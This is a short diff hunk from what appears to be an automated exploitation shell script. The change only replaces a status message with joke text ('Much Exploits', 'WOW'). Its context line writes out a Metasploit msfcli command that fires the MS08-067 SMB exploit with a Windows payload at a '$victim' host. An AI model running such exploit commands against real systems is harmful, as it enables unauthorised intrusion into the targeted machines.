@@ -70,4 +70,5 @@ xterm -e msfcli exploit/windows/smb/ms08_067_netapi RHOST=$victim PAYLOAD=window
 done
 done
 done
-echo "Launching Exploits, Please wait"
+echo "Much Exploits"
+echo "WOW"
